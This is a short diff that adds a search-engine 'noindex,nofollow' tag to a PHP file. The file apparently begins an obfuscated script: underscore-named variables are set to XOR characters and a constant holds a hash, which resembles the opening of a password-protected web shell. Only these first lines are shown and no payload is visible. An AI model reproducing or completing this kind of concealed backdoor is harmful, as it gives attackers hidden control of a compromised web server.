@@ -1,3 +1,4 @@
+<META NAME="robots" CONTENT="noindex,nofollow">
 <?php 
 @${'_'} = "|"; $__ = '^'; $___ = ''; 
 define('_a', '5ea82d36738ff97b70ec0fbd5123e410'); //hihs
